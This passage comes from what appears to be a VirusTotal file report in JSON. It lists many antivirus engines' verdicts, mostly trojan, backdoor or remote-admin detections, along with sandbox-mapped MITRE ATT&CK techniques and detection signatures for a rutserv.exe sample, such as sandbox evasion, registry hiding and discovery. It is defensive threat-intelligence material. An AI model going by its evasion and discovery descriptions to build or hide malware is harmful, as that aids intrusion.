          "result": null,
          "method": "blacklist",
          "engine_update": "20190318"
        },
        "F-Secure": {
          "category": "malicious",
          "engine_name": "F-Secure",
          "engine_version": "18.10.1547.307",
          "result": "Trojan.TR/Bsymem.qybuz",
          "method": "blacklist",
          "engine_update": "20240125"
        },
        "DrWeb": {
          "category": "malicious",
          "engine_name": "DrWeb",
          "engine_version": "7.0.61.8090",
          "result": "BackDoor.RMS.230",
          "method": "blacklist",
          "engine_update": "20240125"
        },
        "VIPRE": {
          "category": "undetected",
          "engine_name": "VIPRE",
          "engine_version": "6.0.0.35",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240124"
        },
        "TrendMicro": {
          "category": "malicious",
          "engine_name": "TrendMicro",
          "engine_version": "11.0.0.1006",
          "result": "TROJ_FRS.VSNTAM24",
          "method": "blacklist",
          "engine_update": "20240125"
        },
        "CMC": {
          "category": "undetected",
          "engine_name": "CMC",
          "engine_version": "2.4.2022.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240106"
        },
        "Sophos": {
          "category": "malicious",
          "engine_name": "Sophos",
          "engine_version": "2.4.3.0",
          "result": "Mal/Generic-S",
          "method": "blacklist",
          "engine_update": "20240124"
        },
        "Ikarus": {
          "category": "malicious",
          "engine_name": "Ikarus",
          "engine_version": "6.2.4.0",
          "result": "Trojan-Spy.Agent",
          "method": "blacklist",
          "engine_update": "20240125"
        },
        "Avast-Mobile": {
          "category": "type-unsupported",
          "engine_name": "Avast-Mobile",
          "engine_version": "240125-02",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240125"
        },
        "Jiangmin": {
          "category": "undetected",
          "engine_name": "Jiangmin",
          "engine_version": "16.0.100",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240124"
        },
        "Webroot": {
          "category": "undetected",
          "engine_name": "Webroot",
          "engine_version": "1.0.0.403",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240125"
        },
        "Varist": {
          "category": "malicious",
          "engine_name": "Varist",
          "engine_version": "6.5.1.2",
          "result": "W64/ABRisk.SNHI-7605",
          "method": "blacklist",
          "engine_update": "20240125"
        },
        "Avira": {
          "category": "malicious",
          "engine_name": "Avira",
          "engine_version": "8.3.3.16",
          "result": "TR/Bsymem.qybuz",
          "method": "blacklist",
          "engine_update": "20240125"
        },
        "Antiy-AVL": {
          "category": "malicious",
          "engine_name": "Antiy-AVL",
          "engine_version": "3.0",
          "result": "GrayWare/Win32.Remote.a",
          "method": "blacklist",
          "engine_update": "20240125"
        },
        "Kingsoft": {
          "category": "undetected",
          "engine_name": "Kingsoft",
          "engine_version": "None",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230906"
        },
        "Gridinsoft": {
          "category": "malicious",
          "engine_name": "Gridinsoft",
          "engine_version": "1.0.155.174",
          "result": "Trojan.Win64.Gen.cl",
          "method": "blacklist",
          "engine_update": "20240125"
        },
        "Xcitium": {
          "category": "malicious",
          "engine_name": "Xcitium",
          "engine_version": "36377",
          "result": "ApplicUnwnt@#2p5eyzwy6unxs",
          "method": "blacklist",
          "engine_update": "20240125"
        },
        "Microsoft": {
          "category": "malicious",
          "engine_name": "Microsoft",
          "engine_version": "1.1.23110.2",
          "result": "HackTool:Win32/RemoteAdmin!MSR",
          "method": "blacklist",
          "engine_update": "20240125"
        },
        "ViRobot": {
          "category": "undetected",
          "engine_name": "ViRobot",
          "engine_version": "2014.3.20.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240125"
        },
        "ZoneAlarm": {
          "category": "malicious",
          "engine_name": "ZoneAlarm",
          "engine_version": "1.0",
          "result": "Trojan.Win32.Bsymem.apya",
          "method": "blacklist",
          "engine_update": "20240125"
        },
        "GData": {
          "category": "malicious",
          "engine_name": "GData",
          "engine_version": "A:25.37231B:27.34689",
          "result": "Win64.Trojan.Agent.CMF518",
          "method": "blacklist",
          "engine_update": "20240125"
        },
        "Google": {
          "category": "malicious",
          "engine_name": "Google",
          "engine_version": "1706184091",
          "result": "Detected",
          "method": "blacklist",
          "engine_update": "20240125"
        },
        "BitDefenderFalx": {
          "category": "type-unsupported",
          "engine_name": "BitDefenderFalx",
          "engine_version": "2.0.936",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240108"
        },
        "AhnLab-V3": {
          "category": "undetected",
          "engine_name": "AhnLab-V3",
          "engine_version": "3.25.0.10459",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240125"
        },
        "Acronis": {
          "category": "undetected",
          "engine_name": "Acronis",
          "engine_version": "1.2.0.121",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230828"
        },
        "VBA32": {
          "category": "undetected",
          "engine_name": "VBA32",
          "engine_version": "5.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240125"
        },
        "ALYac": {
          "category": "undetected",
          "engine_name": "ALYac",
          "engine_version": "2.0.0.8",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240125"
        },
        "MAX": {
          "category": "undetected",
          "engine_name": "MAX",
          "engine_version": "2023.1.4.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240125"
        },
        "Cylance": {
          "category": "malicious",
          "engine_name": "Cylance",
          "engine_version": "2.0.0.0",
          "result": "unsafe",
          "method": "blacklist",
          "engine_update": "20240103"
        },
        "Panda": {
          "category": "undetected",
          "engine_name": "Panda",
          "engine_version": "4.6.4.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240124"
        },
        "Zoner": {
          "category": "undetected",
          "engine_name": "Zoner",
          "engine_version": "2.2.2.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240125"
        },
        "TrendMicro-HouseCall": {
          "category": "malicious",
          "engine_name": "TrendMicro-HouseCall",
          "engine_version": "10.0.0.1040",
          "result": "TROJ_FRS.VSNTAM24",
          "method": "blacklist",
          "engine_update": "20240125"
        },
        "Tencent": {
          "category": "malicious",
          "engine_name": "Tencent",
          "engine_version": "1.0.0.1",
          "result": "Win32.Trojan.Bsymem.Rwhl",
          "method": "blacklist",
          "engine_update": "20240125"
        },
        "Yandex": {
          "category": "undetected",
          "engine_name": "Yandex",
          "engine_version": "5.5.2.24",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240125"
        },
        "SentinelOne": {
          "category": "undetected",
          "engine_name": "SentinelOne",
          "engine_version": "23.4.2.3",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231119"
        },
        "MaxSecure": {
          "category": "malicious",
          "engine_name": "MaxSecure",
          "engine_version": "1.0.0.1",
          "result": "Trojan.Malware.226688521.susgen",
          "method": "blacklist",
          "engine_update": "20240125"
        },
        "Fortinet": {
          "category": "malicious",
          "engine_name": "Fortinet",
          "engine_version": "None",
          "result": "Riskware/RemoteAdmin_RemoteUtilities",
          "method": "blacklist",
          "engine_update": "20240125"
        },
        "AVG": {
          "category": "malicious",
          "engine_name": "AVG",
          "engine_version": "23.9.8494.0",
          "result": "Win64:Malware-gen",
          "method": "blacklist",
          "engine_update": "20240125"
        },
        "DeepInstinct": {
          "category": "malicious",
          "engine_name": "DeepInstinct",
          "engine_version": "5.0.0.8",
          "result": "MALICIOUS",
          "method": "blacklist",
          "engine_update": "20240122"
        },
        "CrowdStrike": {
          "category": "malicious",
          "engine_name": "CrowdStrike",
          "engine_version": "1.0",
          "result": "win/malicious_confidence_100% (W)",
          "method": "blacklist",
          "engine_update": "20231026"
        }
      },
      "reputation": -9,
      "sigma_analysis_stats": {
        "high": 0,
        "medium": 2,
        "critical": 0,
        "low": 0
      }
    },
    "type": "file",
    "id": "5158482849c818c270f302c1dfa06d770ed2b5056cf393d60fd56817636866da",
    "links": {
      "self": "https://www.virustotal.com/api/v3/files/5158482849c818c270f302c1dfa06d770ed2b5056cf393d60fd56817636866da"
    }
  },
  "mitre": {
    "data": {
      "CAPE Sandbox": {
        "tactics": [
          {
            "description": "The adversary is trying to communicate with compromised systems to control them.\n\nCommand and Control consists of techniques that adversaries may use to communicate with systems under their control within a victim network. Adversaries commonly attempt to mimic normal, expected traffic to avoid detection. There are many ways an adversary can establish command and control with various levels of stealth depending on the victim’s network structure and defenses.",
            "techniques": [
              {
                "description": "Adversaries may communicate using OSI application layer protocols to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \nAdversaries may utilize many different protocols, including those used for web browsing, transferring files, electronic mail, or DNS. For connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), commonly used protocols are SMB, SSH, or RDP. ",
                "signatures": [
                  {
                    "severity": "UNKNOWN",
                    "description": "Adversaries may communicate using application layer protocols to avoid detection/network filtering by blending in with existing traffic."
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1071/",
                "id": "T1071",
                "name": "Application Layer Protocol"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0011/",
            "id": "TA0011",
            "name": "Command and Control"
          }
        ]
      },
      "VMRay": {
        "tactics": [
          {
            "description": "The adversary is trying to figure out your environment.\n\nDiscovery consists of techniques an adversary may use to gain knowledge about the system and internal network. These techniques help adversaries observe the environment and orient themselves before deciding how to act. They also allow adversaries to explore what they can control and what’s around their entry point in order to discover how it could benefit their current objective. Native operating system tools are often used toward this post-compromise information-gathering objective. ",
            "techniques": [
              {
                "description": "An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from System Information Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nTools such as Systeminfo can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the systemsetup configuration tool on macOS. As an example, adversaries with user-level access can execute the df -aH command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a Network Device CLI on network devices to gather detailed system information (e.g. show version). System Information Discovery combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.",
                "signatures": [
                  {
                    "severity": "HIGH",
                    "description": "(Process #10) rutserv.exe reads the cryptographic machine GUID from registry."
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1082/",
                "id": "T1082",
                "name": "System Information Discovery"
              },
              {
                "description": "Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Adversaries may use the information from Process Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nIn Windows environments, adversaries could obtain details on running processes using the Tasklist utility via cmd or Get-Process via PowerShell. Information about processes can also be extracted from the output of Native API calls such as CreateToolhelp32Snapshot. In Mac and Linux, this is accomplished with the ps command. Adversaries may also opt to enumerate processes via /proc.\nOn network devices, Network Device CLI commands such as show processes can be used to display current running processes.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "(Process #11) rutserv.exe enumerates running processes."
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1057/",
                "id": "T1057",
                "name": "Process Discovery"
              },
              {
                "description": "Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software.\nThe Registry contains a significant amount of information about the operating system, configuration, software, and security. Information can easily be queried using the Reg utility, though other means to access the Registry exist. Some of the information may help adversaries to further their operation within a network. Adversaries may use the information from Query Registry during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "(Process #10) rutserv.exe reads the cryptographic machine GUID from registry."
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1012/",
                "id": "T1012",
                "name": "Query Registry"
              },
              {
                "description": "Adversaries may look for details about the network configuration and settings, such as IP and/or MAC addresses, of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples include Arp, ipconfig/ifconfig, nbtstat, and route.\nAdversaries may also leverage a Network Device CLI on network devices to gather information about configurations and settings, such as IP addresses of configured interfaces and static/dynamic routes (e.g. show ip route, show ip interface).\nAdversaries may use the information from System Network Configuration Discovery during automated discovery to shape follow-on behaviors, including determining certain access within the target network and what actions to do next. ",
                "signatures": [
                  {
                    "severity": "HIGH",
                    "description": "(Process #10) rutserv.exe gets network statistics via API."
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1016/",
                "id": "T1016",
                "name": "System Network Configuration Discovery"
              },
              {
                "description": "Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors.\nAdversaries may use several methods to accomplish Virtualization/Sandbox Evasion such as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization. Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment. Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox.",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "(Process #9) rutserv.exe tries to detect \"wine\" by calling GetProcAddress() on \"wine_get_version\"."
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1497/",
                "id": "T1497",
                "name": "Virtualization/Sandbox Evasion"
              },
              {
                "description": "Adversaries may attempt to get a listing of network connections to or from the compromised system they are currently accessing or from remote systems by querying for information over the network. \nAn adversary who gains access to a system that is part of a cloud-based environment may map out Virtual Private Clouds or Virtual Networks in order to determine what systems and services are connected. The actions performed are likely the same types of discovery techniques depending on the operating system, but the resulting information may include details about the networked cloud environment relevant to the adversary's goals. Cloud providers may have different ways in which their virtual networks operate. Similarly, adversaries who gain access to network devices may also perform similar discovery activities to gather information about connected systems and services.\nUtilities and commands that acquire this information include netstat, \"net use,\" and \"net session\" with Net. In Mac and Linux, netstat and lsof can be used to list current connections. who -a and w can be used to show which users are currently logged in, similar to \"net session\". Additionally, built-in features native to network devices and Network Device CLI may be used (e.g. show ip sockets, show tcp brief).",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "(Process #10) rutserv.exe gets network statistics via API."
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1049/",
                "id": "T1049",
                "name": "System Network Connections Discovery"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0007/",
            "id": "TA0007",
            "name": "Discovery"
          },
          {
            "description": "The adversary is trying to avoid being detected.\n\nDefense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses. ",
            "techniques": [
              {
                "description": "Adversaries may directly access a volume to bypass file access controls and file system monitoring. Windows allows programs to have direct access to logical volumes. Programs with direct access may read and write files directly from the drive by analyzing file system data structures. This technique may bypass Windows file access controls as well as file system monitoring tools. \nUtilities, such as NinjaCopy, exist to perform these actions in PowerShell. Adversaries may also use built-in or third-party utilities (such as vssadmin, wbadmin, and esentutl) to create shadow copies or backups of data from system volumes.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "(Process #4) msiexec.exe opens a handle to directly access the volume \"C\"."
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1006/",
                "id": "T1006",
                "name": "Direct Volume Access"
              },
              {
                "description": "Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in persistence and execution.\nAccess to specific areas of the Registry depends on account permissions, some requiring administrator-level access. The built-in Windows command-line utility Reg may be used for local or remote Registry modification.  Other tools may also be used, such as a remote access tool, which may contain functionality to interact with the Registry through the Windows API.\nRegistry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via Reg or other utilities using the Win32 API.  Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain persistence.  \nThe Registry of a remote system may be modified to aid in execution of files as part of lateral movement. It requires the remote Registry service to be running on the target system.  Often Valid Accounts are required, along with access to the remote system's SMB/Windows Admin Shares for RPC communication.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "(Process #27) rutserv.exe hides 3902 bytes in \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Usoris\\Remote Utilities Host\\Host\\Parameters\\Certificates\"."
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1112/",
                "id": "T1112",
                "name": "Modify Registry"
              },
              {
                "description": "Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors.\nAdversaries may use several methods to accomplish Virtualization/Sandbox Evasion such as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization. Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment. Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox.",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "(Process #9) rutserv.exe tries to detect \"wine\" by calling GetProcAddress() on \"wine_get_version\"."
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1497/",
                "id": "T1497",
                "name": "Virtualization/Sandbox Evasion"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0005/",
            "id": "TA0005",
            "name": "Defense Evasion"
          }
        ]
      },
      "Yomi Hunter": {
        "tactics": [
          {
            "description": "The adversary is trying to maintain their foothold.\n\nPersistence consists of techniques that adversaries use to keep access to systems across restarts, changed credentials, and other interruptions that could cut off their access. Techniques used for persistence include any access, action, or configuration changes that let them maintain their foothold on systems, such as replacing or hijacking legitimate code or adding startup code. ",
            "techniques": [
              {
                "description": "Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. There are multiple ways to access the Task Scheduler in Windows. The schtasks utility can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel. In some cases, adversaries have used a .NET wrapper for the Windows Task Scheduler, and alternatively, adversaries have used the Windows netapi32 library to create a scheduled task.\nThe deprecated at utility could also be abused by adversaries (ex: At), though at.exe can not access tasks created with schtasks or the Control Panel.\nAn adversary may use Windows Task Scheduler to execute programs at system startup or on a scheduled basis for persistence. The Windows Task Scheduler can also be abused to conduct remote Execution as part of Lateral Movement and/or to run a process under the context of a specified account (such as SYSTEM). Similar to System Binary Proxy Execution, adversaries have also abused the Windows Task Scheduler to potentially mask one-time execution under signed/trusted system processes.\nAdversaries may also create \"hidden\" scheduled tasks (i.e. Hide Artifacts) that may not be visible to defender tools and manual queries used to enumerate tasks. Specifically, an adversary may hide a task from schtasks /query and the Task Scheduler by deleting the associated Security Descriptor (SD) registry value (where deletion of this value must be completed using SYSTEM permissions). Adversaries may also employ alternate methods to hide tasks, such as altering the metadata (e.g., Index value) within associated registry keys. ",
                "signatures": [
                  {
                    "severity": "UNKNOWN",
                    "description": "SetUnhandledExceptionFilter detected: superseding the top-level exception handler of each thread of a process is a common anti-debug technique."
                  },
                  {
                    "severity": "UNKNOWN",
                    "description": "Manalize Local SandBox Find Crypto"
                  },
                  {
                    "severity": "UNKNOWN",
                    "description": "Manalize Local SandBox Strings"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1053/005/",
                "id": "T1053.005",
                "name": "Scheduled Task"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0003/",
            "id": "TA0003",
            "name": "Persistence"
          },
          {
            "description": "The adversary is trying to run malicious code.\n\nExecution consists of techniques that result in adversary-controlled code running on a local or remote system. Techniques that run malicious code are often paired with techniques from all other tactics to achieve broader goals, like exploring a network or stealing data. For example, an adversary might use a remote access tool to run a PowerShell script that does Remote System Discovery. ",
            "techniques": [
              {
                "description": "Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. There are multiple ways to access the Task Scheduler in Windows. The schtasks utility can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel. In some cases, adversaries have used a .NET wrapper for the Windows Task Scheduler, and alternatively, adversaries have used the Windows netapi32 library to create a scheduled task.\nThe deprecated at utility could also be abused by adversaries (ex: At), though at.exe can not access tasks created with schtasks or the Control Panel.\nAn adversary may use Windows Task Scheduler to execute programs at system startup or on a scheduled basis for persistence. The Windows Task Scheduler can also be abused to conduct remote Execution as part of Lateral Movement and/or to run a process under the context of a specified account (such as SYSTEM). Similar to System Binary Proxy Execution, adversaries have also abused the Windows Task Scheduler to potentially mask one-time execution under signed/trusted system processes.\nAdversaries may also create \"hidden\" scheduled tasks (i.e. Hide Artifacts) that may not be visible to defender tools and manual queries used to enumerate tasks. Specifically, an adversary may hide a task from schtasks /query and the Task Scheduler by deleting the associated Security Descriptor (SD) registry value (where deletion of this value must be completed using SYSTEM permissions). Adversaries may also employ alternate methods to hide tasks, such as altering the metadata (e.g., Index value) within associated registry keys. ",
                "signatures": [
                  {
                    "severity": "UNKNOWN",
                    "description": "SetUnhandledExceptionFilter detected: superseding the top-level exception handler of each thread of a process is a common anti-debug technique."
                  },
                  {
                    "severity": "UNKNOWN",
                    "description": "Manalize Local SandBox Find Crypto"
                  },
                  {
                    "severity": "UNKNOWN",
                    "description": "Manalize Local SandBox Strings"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1053/005/",
                "id": "T1053.005",
                "name": "Scheduled Task"
              },
              {
                "description": "Adversaries may execute malicious payloads via loading shared modules. Shared modules are executable files that are loaded into processes to provide access to reusable code, such as specific custom functions or invoking OS API functions (i.e., Native API).\nAdversaries may use this functionality as a way to execute arbitrary payloads on a victim system. For example, adversaries can modularize functionality of their malware into shared objects that perform various functions such as managing C2 network communications or execution of specific actions on objective.\nThe Linux & macOS module loader can load and execute shared objects from arbitrary local paths. This functionality resides in dlfcn.h in functions such as dlopen and dlsym. Although macOS can execute .so files, common practice uses .dylib files.\nThe Windows module loader can be instructed to load DLLs from arbitrary local paths and arbitrary Universal Naming Convention (UNC) network paths. This functionality resides in NTDLL.dll and is part of the Windows Native API which is called from functions like LoadLibrary at run time.",
                "signatures": [
                  {
                    "severity": "UNKNOWN",
                    "description": "SetUnhandledExceptionFilter detected: superseding the top-level exception handler of each thread of a process is a common anti-debug technique."
                  },
                  {
                    "severity": "UNKNOWN",
                    "description": "The process attempted to dynamically load a malicious function"
                  },
                  {
                    "severity": "UNKNOWN",
                    "description": "The process tried to load dynamically one or more functions."
                  },
                  {
                    "severity": "UNKNOWN",
                    "description": "Manalize Local SandBox Find Crypto"
                  },
                  {
                    "severity": "UNKNOWN",
                    "description": "Manalize Local SandBox Strings"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1129/",
                "id": "T1129",
                "name": "Shared Modules"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0002/",
            "id": "TA0002",
            "name": "Execution"
          },
          {
            "description": "The adversary is trying to figure out your environment.\n\nDiscovery consists of techniques an adversary may use to gain knowledge about the system and internal network. These techniques help adversaries observe the environment and orient themselves before deciding how to act. They also allow adversaries to explore what they can control and what’s around their entry point in order to discover how it could benefit their current objective. Native operating system tools are often used toward this post-compromise information-gathering objective. ",
            "techniques": [
              {
                "description": "An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from System Information Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nTools such as Systeminfo can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the systemsetup configuration tool on macOS. As an example, adversaries with user-level access can execute the df -aH command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a Network Device CLI on network devices to gather detailed system information (e.g. show version). System Information Discovery combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.",
                "signatures": [
                  {
                    "severity": "UNKNOWN",
                    "description": "The process tried to collect informations about the system reading some known registry keys"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1082/",
                "id": "T1082",
                "name": "System Information Discovery"
              },
              {
                "description": "Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from File and Directory Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nMany command shell utilities can be used to obtain this information. Examples include dir, tree, ls, find, and locate. Custom tools may also be used to gather file and directory information and interact with the Native API. Adversaries may also leverage a Network Device CLI on network devices to gather file and directory information (e.g. dir, show flash, and/or nvram).",
                "signatures": [
                  {
                    "severity": "UNKNOWN",
                    "description": "SetUnhandledExceptionFilter detected: superseding the top-level exception handler of each thread of a process is a common anti-debug technique."
                  },
                  {
                    "severity": "UNKNOWN",
                    "description": "Manalize Local SandBox Find Crypto"
                  },
                  {
                    "severity": "UNKNOWN",
                    "description": "Manalize Local SandBox Strings"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1083/",
                "id": "T1083",
                "name": "File and Directory Discovery"
              },
              {
                "description": "Adversaries may attempt to get a listing of valid accounts, usernames, or email addresses on a system or within a compromised environment. This information can help adversaries determine which accounts exist, which can aid in follow-on behavior such as brute-forcing, spear-phishing attacks, or account takeovers (e.g., Valid Accounts).\nAdversaries may use several methods to enumerate accounts, including abuse of existing tools, built-in commands, and potential misconfigurations that leak account names and roles or permissions in the targeted environment.\nFor examples, cloud environments typically provide easily accessible interfaces to obtain user lists. On hosts, adversaries can use default PowerShell and other command line functionality to identify accounts. Information about email addresses and accounts may also be extracted by searching an infected system’s files.",
                "signatures": [
                  {
                    "severity": "UNKNOWN",
                    "description": "SetUnhandledExceptionFilter detected: superseding the top-level exception handler of each thread of a process is a common anti-debug technique."
                  },
                  {
                    "severity": "UNKNOWN",
                    "description": "Manalize Local SandBox Find Crypto"
                  },
                  {
                    "severity": "UNKNOWN",
                    "description": "Manalize Local SandBox Strings"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1087/",
                "id": "T1087",
                "name": "Account Discovery"
              },
              {
                "description": "Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software.\nThe Registry contains a significant amount of information about the operating system, configuration, software, and security. Information can easily be queried using the Reg utility, though other means to access the Registry exist. Some of the information may help adversaries to further their operation within a network. Adversaries may use the information from Query Registry during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.",
                "signatures": [
                  {
                    "severity": "UNKNOWN",
                    "description": "The process tried to collect informations about the system reading some known registry keys"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1012/",
                "id": "T1012",
                "name": "Query Registry"
              },
              {
                "description": "Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using OS Credential Dumping. The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information from System Owner/User Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nVarious utilities and commands may acquire this information, including whoami. In macOS and Linux, the currently logged in user can be identified with w and who. On macOS the dscl . list /Users | grep -v '_' command can also be used to enumerate user accounts. Environment variables, such as %USERNAME% and $USER, may also be used to access this information.\nOn network devices, Network Device CLI commands such as show users and show ssh can be used to display users currently logged into the device.",
                "signatures": [
                  {
                    "severity": "UNKNOWN",
                    "description": "SetUnhandledExceptionFilter detected: superseding the top-level exception handler of each thread of a process is a common anti-debug technique."
                  },
                  {
                    "severity": "UNKNOWN",
                    "description": "Manalize Local SandBox Find Crypto"
                  },
                  {
                    "severity": "UNKNOWN",
                    "description": "Manalize Local SandBox Strings"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1033/",
                "id": "T1033",
                "name": "System Owner/User Discovery"
              },
              {
                "description": "Adversaries may gather information in an attempt to calculate the geographical location of a victim host. Adversaries may use the information from System Location Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nAdversaries may attempt to infer the location of a system using various system checks, such as time zone, keyboard layout, and/or language settings. Windows API functions such as GetLocaleInfoW can also be used to determine the locale of the host. In cloud environments, an instance's availability zone may also be discovered by accessing the instance metadata service from the instance.\nAdversaries may also attempt to infer the location of a victim host using IP addressing, such as via online geolocation IP-lookup services.",
                "signatures": [
                  {
                    "severity": "UNKNOWN",
                    "description": "SetUnhandledExceptionFilter detected: superseding the top-level exception handler of each thread of a process is a common anti-debug technique."
                  },
                  {
                    "severity": "UNKNOWN",
                    "description": "Manalize Local SandBox Find Crypto"
                  },
                  {
                    "severity": "UNKNOWN",
                    "description": "Manalize Local SandBox Strings"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1614/",
                "id": "T1614",
                "name": "System Location Discovery"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0007/",
            "id": "TA0007",
            "name": "Discovery"
          },
          {
            "description": "The adversary is trying to avoid being detected.\n\nDefense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses. ",
            "techniques": [
              {
